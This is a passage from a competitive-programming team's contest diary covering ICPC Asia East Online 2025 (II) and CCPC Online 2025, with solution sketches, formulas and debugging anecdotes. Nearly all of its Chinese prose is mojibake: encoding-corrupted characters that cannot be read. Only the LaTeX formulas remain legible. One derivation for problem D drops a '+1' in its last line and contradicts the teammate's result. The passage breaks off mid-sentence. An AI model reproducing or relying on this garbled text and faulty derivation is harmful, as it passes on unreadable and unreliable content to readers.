æ¯”å¦‚ä¸Šå›¾è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬çš„ä¸Šé¢çš„ç­–ç•¥å…¶å®æ˜¯å¯ä»¥ä¿è¯æœºå™¨äººå¿«åˆ°è¾¹ç•Œçš„æ—¶å€™ï¼Œä¸ä¼šå‡ºç°å®ƒèƒ½åˆ°è¾¾çš„äº”ä¸ªè¾¹ç•Œæ ¼å­ $(4,30),(5,30),(6,30),(7,30),(8,30)$ æœ‰ä¸‰ä¸ªè¿ç»­ç©ºç¼ºçš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µèªæ˜çš„æœºå™¨äººè‚¯å®šèƒ½èµ°å‡ºå»ã€‚é‚£ä¹ˆå‡è®¾é‡åˆ°äº†ä¸Šå›¾è¿™ç§æ¼æ´æ¯”è¾ƒå¤§çš„æƒ…å†µï¼Œæˆ‘ä»¬è‚¯å®šè¦ä¼˜å…ˆå µä½ $(6,30)$ï¼Œç„¶åæ ¹æ®å®ƒçš„ç§»åŠ¨å†å»å µä¸‹ä¸€ä¸ªã€‚ æˆ‘ä»¬è¦ä¿è¯ä¸€ä¸ªäº‹æƒ…ï¼šæœºå™¨äººç¦»ä¸‹è¾¹ç•Œçš„æ—¶å€™åªæœ‰ $2$ æ ¼çš„æ—¶å€™ï¼Œå®ƒçš„æ­£ä¸‹æ–¹åŠå‘¨å›´ä¸€å…±äº”ä¸ªæ ¼å­ï¼Œå¿…é¡»æœ‰è‡³å°‘ä¸¤ä¸ªæ˜¯å¡«ä¸Šçš„ï¼›ä»¥åŠï¼Œæœºå™¨äººç¦»ä¸‹è¾¹ç•Œåªæœ‰ä¸€ä¸ªæ ¼å­çš„æ—¶å€™ï¼Œå®ƒçš„æ­£ä¸‹æ–¹åŠå‘¨å›´ä¸€å…±ä¸‰ä¸ªæ ¼å­ï¼Œå¿…é¡»æœ‰è‡³å°‘ä¸¤ä¸ªæ˜¯å¡«ä¸Šçš„ï¼ˆè¿™ä¸ªå¥½ç†è§£ï¼‰ã€‚ ç„¶åå¢™å°±å»ºå®Œå•¦ï¼å‰©ä¸‹çš„å°±æ˜¯æŠŠæœºå™¨äººå›´åœ¨å¢™é‡Œé¢ï¼Œä¸€ç‚¹ä¸€ç‚¹å µæ­»ï¼Œæ„Ÿè§‰æœºå™¨äººåº”è¯¥ä¼šå¾ˆå…´å¥‹å§ï¼ğŸ˜‹ 2025.09.14 The 2025 ICPC Asia East Continent Online Contest (â…¡)C çœ‹äº†ä¸€çœ¼ Zlw å’Œ Sky éƒ½è®¤ä¸ºæ˜¯ç­¾åˆ°ï¼ŒæŒ‰ç…§å¥—è·¯å…ˆäºŒåˆ†ï¼Œç„¶åå°è¯•è´ªå¿ƒåˆ†é…ã€‚å‘ç°å¯ä»¥å°è£…ä¸€ä¸ªå‡½æ•°ä»å°åˆ°å¤§ç¡¬åˆ†é…æ¯ä¸€ç§é¢˜ç›®ï¼Œç„¶åä¸­é—´åˆ†ç±»è®¨è®ºå¦‚ä½•æŠŠå‰é¢çš„ä¸œè¥¿è¡¥åˆ°åé¢ç„¶åå†ç”¨ä¹‹å‰é‚£ä¸ªå‡½æ•°è¡¥é½å‰é¢ï¼Œåˆ†ç±»è®¨è®ºå°‘äº†ä¸€ç‚¹ï¼Œå¤§æ¦‚ 30 åˆ†é’Ÿå†™å®Œã€‚ æ¥ä¸‹æ¥æ˜¯ D é¢˜ã€‚ ã€Sky æ¨æŸ¿å­ã€‘è€ƒè™‘ä¸€ä¸ªå­åºåˆ—çš„å…ƒç´ è¢«ä¸€ä¸ªä¸€ä¸ªå–æ‰æ‰€èƒ½å¾—åˆ°çš„æœ€å¤§ä»·å€¼æ˜¯ï¼Œå…ˆå°†å­åºåˆ—ä»å°åˆ°å¤§æ’åºï¼ˆ$a_1$ åˆ° $a_n$ï¼‰ï¼Œç„¶åä»åå¾€å‰å–ï¼Œè¿™æ ·åé¢å¤§çš„ä»·å€¼å¯ä»¥ç´¯ç§¯åˆ°å‰é¢ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°æœ€å¤§ä»·å€¼ï¼š W_i = a_1 + a_2 + 2 a_3 + 2^2 a_4 + \\cdots 2^{n-2} a_nç„¶åæˆ‘ä»¬å…ˆå°†åŸæœ¬ç»™å®šçš„åºåˆ—æ’åºï¼Œå¯¹äºæ‰€æœ‰å­åºåˆ—ï¼Œåªéœ€è¦è€ƒè™‘ $a_i$ ä½œä¸ºå­åºåˆ—çš„ç¬¬ $j$ ä¸ªæ•°çš„è´¡çŒ®ã€‚Zlw ä½¬æ¨äº†ä¸€ä¸‹å¼å­å‘ç°æ€»çš„ç­”æ¡ˆå°±æ˜¯ \\begin{align} W &= \\sum_{i=1}^n \\left( \\sum_{j=2}^i \\binom{i - 1}{j - 1} \\cdot 2^{j-2} \\cdot 2^{n-i} + 2^{n-i} \\right) \\\\\\ &= \\sum_{i=1}^n 2^{n-i} \\left( \\sum_{j=2}^i \\binom{i - 1}{j - 1} \\cdot 2^{j-2} + 1 \\right) \\\\\\ &= \\sum_{i=1}^n 2^{n-i} \\cdot \\left( \\frac{3^{i-1}-1}{2}+1 \\right) \\\\\\ &= \\sum_{i=1}^n 2^{n-i} \\cdot \\frac{3^{i-1}-1}{2} \\end{align}è¿™é‡Œè¦æ³¨æ„ä¸¤ä¸ªç»†èŠ‚ï¼š ä¸€ä¸ªæ˜¯æœ€å¤§ä»·å€¼åºåˆ—çš„ç³»æ•°å¹¶ä¸æ˜¯ä¸€ä¸ª $2^i$ çš„åºåˆ—ï¼Œå…¶ç¬¬ä¸€é¡¹å’Œç¬¬äºŒé¡¹éƒ½æ˜¯ $1$ï¼Œåœ¨è®¡ç®—ç­”æ¡ˆçš„æ—¶å€™è¦å¤„ç†ä¸€ä¸‹ã€‚ ç¬¬äºŒä¸ªå°±æ˜¯äºŒé¡¹å¼å®šç†ï¼Œè¦ç¡®ä¿ä¸ç®—é”™ã€‚ ã€Zlw æ¨æŸ¿å­ã€‘å°è¯•è®¡ç®— $a_i$ åœ¨æœ€ç»ˆç­”æ¡ˆä¸­çš„å‡ºç°æ¬¡æ•°ã€‚å¯ä»¥æšä¸¾ $a_i$ åœ¨ç­”æ¡ˆä¸­çš„æ’å $r$ï¼Œç›¸åŒ $a_i$ çº¦æŸä¸ºæŒ‰åŸåºåˆ—çš„é¡ºåºå³å¯ã€‚å¾—åˆ°ï¼š f_i=[\\sum_{i=2}^{r} \\binom{r-1}{i-1}2^{n-r}\\times 2^{i-2}]+2^{n-r}=2^{n-r}\\times(\\sum_{i=0}^{r-1}(\\binom{r-1}{i}2^{i-1})-\\frac{1}{2})+1)=2^{n-r}\\frac{3^{r-1}+1}{2}ç„¶åä¹˜ä¸Šç³»æ•°åŠ èµ·æ¥å³å¯ã€‚ æˆ‘åœ¨çœ‹ Eï¼Œçœ‹ç€ $n,m$ å‡ä¸º $10^9$ çš„æ•°æ®äº§ç”Ÿäº†ç–‘é—®ï¼Œè¶ç€ç©ºæœºçš„æ—¶å€™æ•²äº†æš´åŠ› dfsã€‚å¾ˆå¿«å°±å‘ç° $n$ ä¸ºå¥‡æ•°çš„æ—¶å€™ç­”æ¡ˆä¸º $(2^m - 1)^{n - 1}$ï¼Œä½†æ˜¯å¶æ•°çš„æ—¶å€™æ²¡å‘ç°è§„å¾‹ã€‚Zlw çœ‹äº†ä¸€çœ¼å¥‡æ•°çš„ç­”æ¡ˆç„¶åå°è¯•çŒœæµ‹å«ä¹‰ï¼Œ$n - 1$ ä¸ªæ•°éšä¾¿å¡«ï¼Œç„¶åç”¨æœ€åä¸€ä¸ªæ•°å»ä¿®æ­£ã€‚å¶æ•°ä¼¼ä¹ä¼šé‡åˆ°ç›¸é‚»é‡å¤çš„é—®é¢˜ã€‚äºæ˜¯æˆ‘çµå…‰ä¸€ç°ï¼Œå°è¯•ç”¨å¥‡æ•°è§„å¾‹çš„ç­”æ¡ˆå’Œæ­£ç¡®ç­”æ¡ˆä½œå·®ï¼Œè¿˜çœŸç»™æˆ‘æ‰¾åˆ°è§„å¾‹äº†ï¼å¶æ•°æ—¶å€™çš„ç­”æ¡ˆä¸º $(2^m - 1)^{n - 1} + (-1)^{\\frac{n}{2}} \\times (2^m - 1)^{\\frac{n}{2}}$ã€‚å“¦ï¼Œè¿˜è¦ç‰¹åˆ¤ $n = 2$ æ—¶ç­”æ¡ˆä¸º $0$ã€‚äºæ˜¯ä¹è¿™é¢˜è¢«æˆ‘çŒœå®Œäº†ï¼Œæäº¤ä¸€å‘é€šè¿‡ã€‚ H é¢˜ Zlw çœ‹äº†å¾ˆä¹…ç»ˆäºçœ‹æ‡‚é¢˜äº†ï¼Œç„¶åå‘ç°å…¶å®å¯ä»¥å¼ºåˆ¶é“¾å¤´é“¾å°¾æ”¹å˜ï¼Œç„¶åç®—æ¯ä¸ªé•¿åº¦çš„é“¾æœ‰å¤šå°‘æ¡å°±å¯ä»¥ã€‚ä½†æ˜¯æ„Ÿè§‰æ€è·¯å¾ˆç®€å•ï¼Œè·Ÿæ ‘æ²¡ä»€ä¹ˆå…³ç³»ï¼Œç„¶åä¸­é—´æ¸…ç©ºå†™æŒ‚äº†ä¸€ä¸ª corner case ä¸€ç›´æ²¡å‘ç°ï¼Œçº¢æ¸©äº†å¾ˆä¹…ã€‚è¿˜è´¡çŒ®äº†ä¸¤ç½šæ—¶ + 40 min æ€è€ƒæ—¶é—´ï¼ˆè¿™ä¹Ÿå¯¼è‡´æˆ‘ä»¬æ¯”å¦å¤–ä¸€ä¸ªé˜Ÿç½šæ—¶å¤šäº† 2 minï¼‰ã€‚ I é¢˜ Zlw å¼€å±€æœ‰ç‚¹çœ‹é”™é¢˜ï¼Œä»¥ä¸ºå¯ä»¥ç›´æ¥é—® $(1,n,1)$ï¼Œåæ¥å‘ç°è¯¢é—®å‡ºæ¥çš„å¼å­å½¢å¦‚ $zf_1+z^2f_2+z^3f_+\\cdots +z^{n-1}f_{n-1}$ï¼Œä½†æ˜¯å¹¶æœªæƒ³æ‰“æ‹‰æ ¼æœ—æ—¥æ’å€¼ï¼Œåªæƒ³åˆ°ä¹Ÿè®¸å¯ä»¥é«˜æ–¯æ¶ˆå…ƒã€‚Sky å°è¯•æ ¹æ®å›¾ä¸Šçš„æƒ…å†µå¯»æ‰¾æ–¹æ¡ˆä½†æ˜¯å¤±è´¥äº†ï¼Œäºæ˜¯ Sky å»å’Œ Scy çœ‹è®¡ç®—å‡ ä½•å»äº†ã€‚ä»é«˜æ–¯æ¶ˆå…ƒçš„æ€è·¯å‡ºå‘ï¼Œå°è¯•é€šè¿‡ $n-1$ æ¬¡è¯¢é—®ç‰¹æ®Šçš„ $z$ ä»è€Œèƒ½å¤Ÿ $n^2$ æ¶ˆå…ƒã€‚æœ€ç»ˆåœ¨ç³»æ•°çŸ©é˜µä¸Šå‘ç°äº†è§„å¾‹ï¼Œç”±äºæœ€ç»ˆåªå…³å¿ƒæœ€åä¸€ä¸ªå¼å­çš„ç»“æœï¼Œå¯ä»¥è®¡ç®—ä» $n-1$ ä¸ªå¼å­å‡‘æœ€åç»™å®šå¼å­çš„å€¼ï¼Œäºæ˜¯å¯ä»¥æŠŠçŸ©é˜µæ—‹è½¬æ±‚ $n-1$ ä¸ªç³»æ•°ã€‚æ­¤æ—¶çš„çŸ©é˜µç¬¬ $i$ åˆ—å½¢å¦‚ $\\vec a=[a_i,a_i^2,a_i^3,\\cdots,a_i^{n-1}]$ï¼Œä»¤ç¬¬ $j$ è¡Œå¼å­ä¸º $f_j$ï¼Œå¯¹æ¯ä¸ª $i$ åšå·®åˆ† $f_j\\leftarrow f_j-a_i\\times f_{i-1}$ å³å¯æ¶ˆå‡ºä¸Šä¸‰è§’çŸ©é˜µï¼Œæ¯ä¸€é¡¹å‘ˆç°ä¸‹é™å¹‚çš„å½¢å¼ã€‚å¦‚æœè¯¢é—® $1$ åˆ° $n-1$ åˆ™ä¼šä½¿å¾—ä¸Šä¸‰è§’çš„ $a_{i,j}=A(j,i)$ã€‚ç„¶åå¯¹ä¸Šä¸‰è§’ç›´æ¥æ¶ˆå…ƒå³å¯ $n^2$ å¾—åˆ°ç³»æ•°äº†ã€‚ ä½†æ˜¯èµ›æ—¶å†™é”™äº† $A^m_n$ çš„å…¬å¼ï¼Œæ‰¾ Sky éªŒè¯è¿˜è¯´æ²¡é—®é¢˜ï¼Œä»¥ä¸ºçœŸæ²¡é—®é¢˜ã€‚ä»¥åŠå·®åˆ†çš„æ—¶å€™æ¯æ¬¡åªç”¨å·®åˆ† $n-i+1$ é¡¹ï¼Œç»“æœæˆ‘å…¨éƒ¨å·®åˆ†äº†ï¼Œåé¢æ•°ç»„è¿˜æé”™äº†ä¸€ä¸ªåœ°æ–¹ã€‚ä½†æ˜¯æ²™æ¯”äº¤äº’åº“ WA è¿”å› REï¼Œæœ€åæ—¶é—´ç´§åªæµ‹äº†ä¸€ä¸ªæ‰‹æ“çš„æ ·ä¾‹ï¼Œä»¥ä¸ºåªæ˜¯å“ªé‡Œä¸å°å¿ƒ RE äº†ä¸€ç›´ç–¯ç‹‚æäº¤ç›´åˆ°å‘ç°æ˜¯æ„Ÿå¹å·ä¹‹å RE äº†ï¼Œä¸€ç›´æ²¡æœ‰è®¤çœŸè°ƒè¯•ï¼Œä»¥åäº¤äº’é¢˜ä¸èƒ½ç›¸ä¿¡äº¤äº’åº“è¿”å›çš„ç»“æœã€‚ A é¢˜å…¶å®ä¸éš¾ï¼Œä½†æ˜¯å› ä¸ºæ˜¯è®¡ç®—å‡ ä½•ï¼Œä¸€å¼€å§‹å°±ç›´æ¥è·³è¿‡äº†ï¼Œæœ€åä¸€ä¸ªå°æ—¶æ‰å¼€å§‹è®¤çœŸçœ‹ï¼Œç»“æœæœ€åå› ä¸ºä¸€ç‚¹ç‚¹å°ç»†èŠ‚æ²¡æœ‰ ACã€‚ é¢˜ç›®å¤§æ„æ˜¯ç»™å®š $z$ å¹³é¢ä¸Šå‡ ä¸ªç‚¹ï¼Œæ¯ä¸ªç‚¹éƒ½å¯èƒ½æœ‰åŠå¾„ä¸º $R_2$ çš„è¯¯å·®ï¼Œç„¶åæœ‰ä¸ªåŠå¾„ä¸º $R_3$ çš„çƒä½“å°é¸Ÿï¼Œä¸­å¿ƒåœ¨ $z$ å¹³é¢ä¸Šï¼Œå¯ä»¥åœ¨ç»™çš„å‡ ä¸ªç‚¹ä¹‹é—´éšä¾¿æ¸¸èµ°ï¼Œæ±‚å°é¸Ÿæ¸¸èµ°å¯èƒ½æœ€å¤§çš„å‡¸åŒ…ä½“ç§¯ã€‚ ç¨å¾®ç”»å‡ ä¸ªå›¾å°±ä¼šå‘ç°å…¶å®å°±æ˜¯ï¼Œç›´æ¥å…ˆæ±‚åŸæ¥å‡ ä¸ªç‚¹çš„å¹³é¢å‡¸åŒ…ï¼Œç„¶åå‡¸åŒ…æœ€å¤–å›´å»¶ç”³ $R_2$ çš„é•¿åº¦ï¼Œç«¯ç‚¹å¤„å°±æ˜¯åœ†å½¢å¹³æ»‘æ›²çº¿ã€‚æ ·ä¾‹ç»™çš„å›¾æŒºå¥½çš„ã€‚ç„¶ååˆ°ä¸‰ç»´å°±æ˜¯åˆšæ‰è¿™ä¸ªå›´èµ·æ¥çš„æ›²çº¿è¾¹ç¼˜å˜æˆåŠå¾„ä¸º $R_3$ çš„åŠçƒå½¢ï¼Œé«˜åº¦ä¸º $2R_3$ çš„ç«‹ä½“å›¾å½¢ã€‚æ ·ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå°±æ˜¯æ±‚è¿™ç©æ„çš„ä½“ç§¯ï¼š èµ›æ—¶ Sky å·²ç»é€šè¿‡åˆ‡å‰²ï¼Œå°†è¿™ä¸ªå›¾å½¢å¤§è‡´åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼šä¸­å¿ƒçš„æŸ±ä½“ã€å‘¨å›´ç›´çº¿è¾¹å’Œåœ†è§’ã€‚å…¶ä¸­ä¸­å¿ƒæŸ±ä½“å’Œç›´çº¿è¾¹éƒ½å¾ˆå¥½ç®—ï¼Œç®€å•çš„ä½“ç§¯å…¬å¼å°±èƒ½ç®—å‡ºæ¥ï¼Œä½†æ˜¯ï¼Œåœ¨è®¡ç®—åœ†è§’çš„ä½“ç§¯çš„æ—¶å€™å‡ºç°äº†ä¸¥é‡é—®é¢˜ã€‚ Sky å’Œ Scy å½“æ—¶ç®€å•åœ°å°†åœ†è§’åˆåˆ‡æˆäº†ä¸Šé¢ä¸¤ä¸ªç«‹ä½“å›¾å½¢ï¼Œä¸€ä¸ªæ ‡å‡†åœ†æŸ±ä½“å’Œä¸€ä¸ªåŠåœ†æŸ±ä½“ï¼Œæƒ³å½“ç„¶åœ°è®¤ä¸ºåœ†è§’ä½“ç§¯å’Œå°±æ˜¯ï¼š V_1 = 2 \\pi R_2^2 R_3 + \\pi^2 R_2 R_3^2å¯¼è‡´èµ›æ—¶æœ€åååˆ†é’Ÿè¿æ ·ä¾‹éƒ½æ²¡è¿‡ï¼Œè€Œä¸”å°±å·®ä¸€ç‚¹ã€‚é‚£ä¹ˆè¿™ä¸ªå¼å­é”™åœ¨å“ªå‘¢ï¼Œéš¾é“åœ†è§’ä¸èƒ½è¿™ä¹ˆåˆ‡å‰²å—ï¼Ÿè¿˜çœŸæ˜¯ã€‚ èµ›å Sky ç”¨ç§¯åˆ†é‡æ–°ç®—äº†ä¸€éï¼Œå…ˆè®°ï¼š R = R_2 + \\sqrt{R_3^2 - z^2} \\\\\\ f(z) = S = \\pi R^2ç„¶åä½“ç§¯å°±æ˜¯ \\begin{align} V_2 &= 2 \\int_0^{R_3} f(z) dz \\\\\\ &= 2 \\int_0^{R_3} (\\pi R_2^2 + \\pi R_3^2 - \\pi z^2 + 2 \\pi R_2 \\sqrt{R_3^2 - z^2}) dz \\\\\\ &= 2 \\pi R_2^2 R_3 + \\pi^2 R_2 R_3^2 + \\frac{4}{3} \\pi R_3^3 \\end{align}ä¼šå‘ç° $V_2$ æ¯”ä¸Šé¢çš„ $V_1$ å¤šäº†ä¸€ä¸ª $\\frac{4}{3} \\pi R_3^3$ï¼Œå³ä¸€ä¸ªåŠå¾„ä¸º $R_3$ çš„çƒçš„ä½“ç§¯ï¼Œå°±æ˜¯é¸Ÿæœ¬èº«ï¼Œåˆ°åº•å“ªé‡Œå¤šå‡ºæ¥äº†ä¸€åªé¸Ÿï¼Ÿï¼Ÿ å…¶å®å°±æ˜¯åˆ‡å‰²åœ†è§’çš„é—®é¢˜ï¼Œæˆ‘ä»¬å°†åœ†æŸ±å‘¨å›´ä¸€åœˆå±•å¼€çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ç›´æ¥ç”¨å³è¾¹é‚£ä¸ªåŠåœ†æŸ±çš„ä½“ç§¯å»ç®—çš„ï¼Œå› ä¸ºè¿™ä¸ªåŠåœ†æŸ±æ˜¯å‹ç¼©è¿‡çš„ï¼Œæˆ‘ä»¬è¦è€ƒè™‘å†…åŠå¾„å’Œå¤–åŠå¾„é•¿åº¦ä¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´å‘¨å›´è¿™ä¸€åœˆæ˜¯ä¸èƒ½è¢«å±•å¼€çš„ï¼Œè¦ä¹ˆç”¨ç§¯åˆ†ç®—ï¼Œè¦ä¹ˆå°±å±•å¼€åå†æŠŠçƒä½“çš„ä½“ç§¯åŠ ä¸Šã€‚ èµ›ååŠ äº†é¸Ÿçš„ä½“ç§¯ä¹‹åä¸€å‘é€šè¿‡ã€‚ 2025.09.20 ç¬¬åä¸€å±Šä¸­å›½å¤§å­¦ç”Ÿç¨‹åºè®¾è®¡ç«èµ›ç½‘ç»œé¢„é€‰èµ›ï¼ˆCCPC Online 2025ï¼‰E é¢˜å‘ç°æ˜¯ç­¾åˆ°ï¼Œä½†æ˜¯ Sky ä¸€å¼€å§‹æœ‰ç‚¹æ€¥ï¼ŒæŠ¥äº†ä¸€ä¸ªé”™è¯¯çš„ç­”æ¡ˆï¼Œå–œæ 20 min ç½šæ—¶ã€‚å†·é™äº†ä¸€ä¸‹å‘ç°ç­”æ¡ˆåº”è¯¥æ˜¯ $2(m - \\lfloor\\frac{n}{2}\\rfloor) - 1$ï¼Œé‡æ–°æäº¤åé€šè¿‡ã€‚ A é¢˜ Sky å’Œ Zlw å¼€äº†ã€‚å¼€å±€å…ˆçœ‹é”™é¢˜ä»¥ä¸ºæ­£æ–¹å½¢éœ€è¦æ¨ªå¹³ç«–ç›´ï¼Œçœ‹å®Œæ ·ä¾‹çªç„¶å‚»çœ¼ï¼Œæˆ‘ä¸€å¼€å§‹è®¤ä¸ºå¯ä»¥æšä¸¾å¼¦å›¾ä¸­é—´çš„å°æ­£æ–¹å½¢ï¼Œç„¶ååšå…«æ¬¡åŒºé—´åŠ ï¼Œå¤æ‚åº¦æ ¹å·ä½†æ˜¯å¸¸æ•°å·¨å¤§ä¸”ä¸å¥½å†™ã€‚ç„¶å Sky é€šè¿‡çº¦æŸ $4$ ä¸ªé¡¶ç‚¹çš„ä½ç½®å†™å‡ºäº†ä¸ç­‰å¼ï¼Œå¯ä»¥æšä¸¾å…¶ä¸­ä¸€ä¸ªå˜é‡ç„¶åç›´æ¥ç®—å¦ä¸€ä¸ªå˜é‡çš„åŒºé—´å³å¯ï¼Œå¤æ‚åº¦æ ¹å·ï¼Œå¯ä»¥é€šè¿‡ã€‚ æˆ‘æƒ³åˆ°ä¸€ä¸ª G çš„åšæ³•ï¼Œäºæ˜¯ä¸Šæœºå°è¯•å†™ï¼Œå†™åˆ°ä¸€åŠçªç„¶å‘ç°å¦‚æœä¸€ä¸ªæ•°æœ‰ $\\frac{n}{2}$ æ¬¡ï¼Œç„¶åè¯¢é—®å…¶å®ƒæ‰€æœ‰æ•°ï¼Œä¼šç›´æ¥å¯¼è‡´æˆ‘å¡æˆ $n^2$ã€‚äºæ˜¯å¼€å§‹è¿›ä¸€æ­¥æ‰‹ç© Kï¼Œè¯•äº†å‡ ä¸ªå‘ç°å€’åºè¾“å‡ºå°±æ˜¯æœ€ä¼˜çš„ï¼Œç„¶åæ­¤æ—¶ç­”æ¡ˆæ˜¯ $\\frac{n(n + 1)}{2}$ï¼Œç¬¬ä¸€ WA ç”±äºæ•°é”™äº†å¯¼è‡´ï¼Œé‡æ–°ä¿®æ­£ä»¥åé€šè¿‡ã€‚ Zlw æ¥çœ‹ G äº†ï¼Œæƒ³äº†ä¸€ä¸‹ Scy çš„åšæ³•è™½ç„¶å‡äº†ï¼Œä½†å…¶å®ä»–çš„åšæ³•å†æ ¹å·åˆ†æ²»ä¸€ä¸‹å°±çœŸäº†ã€‚æ€è€ƒåç”¨äº†ä¼ ç»Ÿåºåˆ—åˆ†å—ï¼Œå—ä¹‹é—´çš„è´¡çŒ®ç›´æ¥ç®—ï¼Œå—å†… $O(B^2)$ é¢„å¤„ç†ï¼Œæ€»å¤æ‚åº¦ $O(n^{1.5})$ã€‚ C é¢˜ Sky å…ˆå’Œè®¨è®º Scy ç„¶åæå‡ºäº†ä¸€ä¸ªç¥å¥‡çš„è´ªå¿ƒã€‚Sky åœ¨è½¬è¿°çš„æ—¶å€™ç”¨äº†ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„ä¾‹å­ï¼Œä½† Zlw è®¤ä¸ºæœ‰ç‚¹è¯¯å¯¼é¢˜ç›®æ„æ€ï¼ˆç”©é”…ï¼‰ã€‚åæ¥å‘ç°æœ¬è´¨ä¸Šæ˜¯å®Œå…¨å›¾æœ€å°ç”Ÿæˆæ ‘ï¼Œå°è¯•æƒ³ B ç®—æ³•ã€‚ç»“åˆ Sky çš„æ€è·¯æœ¬è´¨ä¸Šæ˜¯è¦æ‰¾è¿é€šå—å¤–çš„æœ€å°è¾¹ï¼Œä¸ B ç®—æ³•æä¸ºç±»ä¼¼ï¼Œç”±äºæ²¡å†™è¿‡ B ç®—æ³•ï¼Œå‡ºäºæ­£ç¡®æ€§çš„è€ƒé‡ï¼Œå¯å‘å¼åˆå¹¶å­˜å‚¨äº†æ¯ä¸ªè¿é€šå—å†…çš„ç‚¹ï¼Œç”¨å—å†…ç‚¹æ¶ˆé™¤å…¨å±€ multiset çš„è´¡çŒ®åå¯»æ‰¾æœ€è¿‘ç‚¹ï¼Œç„¶åå¹¶æŸ¥é›†åˆå¹¶ï¼Œè¿­ä»£äº† $O(\\log n)$ å±‚ï¼Œäº¤ä¸Šå»å‘ç°è¿‡äº†ã€‚ ä¹‹åæˆ‘å‘ç° M æ˜¯ä¸€ä¸ªè¶…ç»æ„é€ å°±å¼€å§‹æƒ³ã€‚èµ›æ—¶æ²¡æœ‰è€ƒè™‘åˆ°ä¸€äº›é—®é¢˜å¯¼è‡´å‡æ‰ä¸€ç›´ WAï¼Œæœ€åä¹Ÿæ²¡è¿‡ã€‚èµ›åä¿®è¡¥äº† bug ä½†å‘ç°éœ€è¦ $ 200$ æ¬¡ï¼Œé‚å€’é—­ã€‚ é¦–å…ˆå…ˆå¯¹ $X$ æ±‚å‰ç¼€å’Œï¼Œæ¯æ¬¡é€‰å–æ¯å—çš„ç¬¬ $i$ ä½å»åŠ ä¸Šå‰ä¸€ä½çš„å€¼ã€‚ä½†æœ‰äº›ä½ç½®æ˜¯ä¸éœ€è¦çš„ï¼Œå¾—æŠŠå½±å“æ¶ˆé™¤ï¼Œäºæ˜¯èŠ±è´¹é¢å¤–çš„ $2 \\times 32 = 64$ æ¬¡å€ŸåŠ© $Y$ åšä¹˜æ³•ååšå‡æ³•ã€‚ä¹‹åæ˜¯å—ä¹‹é—´çš„åˆå¹¶ï¼Œä½†æ˜¯ä»ç„¶è¦è€ƒè™‘åˆ°å¤šä½™çš„å½±å“ï¼Œäºæ˜¯ $Y$ å…ˆåšå‰ç¼€ $\\max$ï¼Œä¹‹åå†æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•å…ˆåŠ å†æ¶ˆé™¤å½±å“ã€‚æ€»å…±ç”¨äº† $221$ æ¬¡ã€‚å‘ç°æ“ä½œæœ‰å†—ä½™çš„åœ°æ–¹ï¼Œä½†æ˜¯èµ›åæƒ³äº†å¾ˆä¹…éƒ½æ²¡æƒ³å‡ºæ¥ã€‚ çœ‹äº†ä¸€ä¸ª Hint ä¹‹åç›´æ¥é¡¿æ‚Ÿã€‚å…·ä½“å¦‚ä¸‹ï¼š å…ˆèŠ± $32$ æ¬¡æ±‚å‡ºæ¯ä¸ªå—å†…çš„å‰ç¼€å’Œï¼ˆä¸ç®¡ $Y$ æ•°ç»„ï¼‰ï¼Œç„¶åèŠ± $32$ æ¬¡ç»´æŠ¤å—ä¹‹é—´çš„å‰ç¼€å’Œã€‚å³ $x_i = \\sum \\limits_{j=0}^i x_j$ã€‚ èŠ±è´¹ $32$ æ¬¡åšä¹˜æ³• $y_i = x_i \\times y_i$ï¼Œéé›¶ä½ä¹Ÿå°±å˜æˆäº†æ— ç”¨çš„ä½ç½®çš„å‰ç¼€å’Œã€‚ ä¸ $1$ ç±»ä¼¼ï¼ŒæŠŠå‰ç¼€å’Œæ”¹ä¸ºå‰ç¼€ $\\max$ï¼Œå³ $y_i = \\max \\limits_{j=0}^i \\{y_j\\}$ã€‚ æœ€åèŠ±è´¹ $32$ æ¬¡åšå‡æ³•æ¶ˆé™¤å½±å“ï¼Œ$x_i = x_i - y_i$ã€‚ å¥½å§ç¡®å®æ˜¯ä¸ªè„‘ç“œé¢˜ï¼Œé¢˜ç›®çœ‹äº†å¾ˆä¹…æ‰æ‡‚ï¼Œç„¶åä¼¼ä¹åªæœ‰ä¸€ç§è§£æ³•ï¼ˆï¼Ÿï¼‰ï¼Œä¹Ÿå°±æ˜¯åªæœ‰è„‘ç”µæ³¢å¯¹ä¸Šäº†æ‰å¯èƒ½åšå‡ºæ¥ã€‚ç„¶è€Œæˆ‘å¹¶æ²¡æœ‰è„‘ç“œï¼Œä¹Ÿå°±åªèƒ½åœ¨èµ›æ—¶ç–¯ç‹‚ WA äº† qwqã€‚ D æ˜¯ Zlw æƒ³å‡ºæ¥çš„ï¼Œ$04:57$ æ‰é€šè¿‡éå¸¸æé™ã€‚æƒ³äº†å¾ˆä¹…ä¸å­åºåˆ—æ–¹æ¡ˆæ•°ç›¸å…³çš„åšæ³•ï¼Œä½†æ˜¯æ— ä¸€ä¾‹å¤–çš„ä¼šç®—é‡ï¼Œéš¾ä»¥ç»´æŠ¤å·¦ç«¯ç‚¹çš„åˆæ³•ä¸ªæ•°ã€‚åæ¥å‘ç°éšç€ $r$ çš„å¢åŠ ï¼Œå‰é¢å¯è¡Œçš„ $l$ åœ¨åé¢å¯è¡Œçš„ $r$ ä¸­ä¸€ç›´å¯è¡Œï¼Œå…·æœ‰å•è°ƒæ€§ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥ç»´æŠ¤ $dp_{i,j}$ è¡¨ç¤ºè€ƒè™‘ $[1,i]$ï¼ŒåŒ¹é…åˆ°ç¬¬ $j$ æ®µä¸”æ°å¥½ç¬¬ $j$ æ®µæœ«å°¾åœ¨ $i$ æ—¶ï¼Œæœ€å¤§çš„å¯è¡Œçš„ $l$ åœ¨å“ªã€‚å¯¹äºé¦–å°¾æ— æ˜Ÿå·ï¼Œéœ€è¦ç»´æŠ¤å‰ç¼€å¯è¡Œç‚¹æ•°ï¼›å¯¹äºå•ä¸€å‰é¢ï¼ˆåœ¨åé¢å°±ç¿»è½¬ï¼‰çš„æ˜Ÿå·ï¼Œå¯ä»¥ç›´æ¥äº§ç”Ÿ $dp_{i,tot}$ çš„è´¡çŒ®ï¼›å¯¹äºå‰åéƒ½æœ‰æ˜Ÿå·ï¼Œè¿˜éœ€è¦å†å¯¹ $dp$ 